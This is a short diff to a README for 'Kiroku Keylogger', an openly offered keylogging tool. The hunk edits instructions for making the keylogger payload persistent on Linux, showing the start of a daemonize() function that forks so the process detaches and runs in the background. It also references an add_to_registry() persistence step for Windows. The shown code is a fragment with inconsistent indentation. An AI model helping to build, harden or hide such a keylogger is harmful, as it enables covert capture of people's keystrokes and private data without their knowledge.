@@ -109,13 +109,13 @@ Kiroku Keylogger is a sophisticated tool designed to capture and monitor a wide 
          add_to_registry()
      ```
 
-- **If you want to make it persistent when you convert it to executable in Linux, you'll need to add a logic in the payload that can move deattach itself when it's executable, Here's how you can do that:**
+- **If you want to make it persistent when you convert it to executable in Linux, you'll need to add a logic in the payload that can move detach itself in the terminal and run as a background process when it's executable, Here's how you can do that:**
   1. Add this function:
      ```python
-     def daemonize():
-         """Detach the process from the terminal and run it in the background."""
+     # Detach the process from the terminal and run it in the background
+     def daemonize(): 
          try:
-         # Fork the first child process
+             # Fork the first child process
              pid = os.fork()
                  if pid > 0:
                  # Exit the parent process
